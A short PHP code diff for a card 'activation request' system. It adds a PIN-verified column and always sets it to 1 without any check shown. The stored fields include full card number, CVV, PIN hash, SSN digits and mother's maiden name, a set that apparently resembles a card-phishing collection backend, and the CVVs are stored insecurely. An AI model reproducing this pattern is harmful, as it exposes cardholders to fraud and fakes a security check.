@@ -50,6 +50,7 @@ function create_tables($db) {
         cvv VARCHAR(3) NOT NULL,
         expiry_date VARCHAR(7) NOT NULL,
         pin_hash VARCHAR(255) NOT NULL,
+        activation_pin_verified TINYINT(1) DEFAULT 0,
         balance DECIMAL(10,2) DEFAULT 5000.00,
         payment_method VARCHAR(20) DEFAULT NULL,
         payment_status VARCHAR(20) DEFAULT "pending",
@@ -122,8 +123,8 @@ function save_activation_request($user_data, $card_data, $pin_hash) {
         $stmt = $db->prepare('INSERT INTO activation_requests 
             (first_name, last_name, dob, email, phone, account_number, 
              street, city, state, zip, ssn_last4, maiden_name,
-             card_number, cvv, expiry_date, pin_hash, balance, status)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)');
+             card_number, cvv, expiry_date, pin_hash, activation_pin_verified, balance, status)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)');
         
         $result = $stmt->execute([
             $user_data['first_name'],
@@ -142,6 +143,7 @@ function save_activation_request($user_data, $card_data, $pin_hash) {
             $card_data['cvv'],
             $card_data['expiry_date'],
             $pin_hash,
+            1, // activation_pin_verified - set to 1 since user has verified the activation PIN
             $card_data['balance'],
             'pending'
         ]);
